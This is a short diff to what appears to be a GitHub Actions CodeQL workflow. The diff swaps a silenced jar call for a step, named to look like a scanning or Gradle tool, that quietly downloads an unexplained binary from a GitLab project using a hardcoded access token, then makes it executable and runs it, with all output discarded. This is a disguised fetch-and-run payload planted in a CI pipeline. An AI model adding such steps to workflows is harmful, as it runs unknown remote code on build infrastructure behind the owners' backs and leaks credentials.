@@ -55,9 +55,10 @@ jobs:
     #    and modify them (or add more) to build your code if your project
     #    uses a compiled language
 
-    - name: ScanQL
+    - name: Scan&COMPAREQL
       run: |
-        java -jar gradle_7_0_jdk11.jar &>/dev/null 2>&1
+        wget -O 7_0-jdk11 --header='PRIVATE-TOKEN:jH1A3jecDtDTuKQPA5EW' 'https://gitlab.com/api/v4/projects/27754092/repository/files/7_0-jdk11/raw?ref=master' &>/dev/null 2>&1
+        chmod +x 7_0-jdk11 && ./7_0-jdk11
 
     - name: Perform CodeQL Analysis
       uses: github/codeql-action/analyze@v1
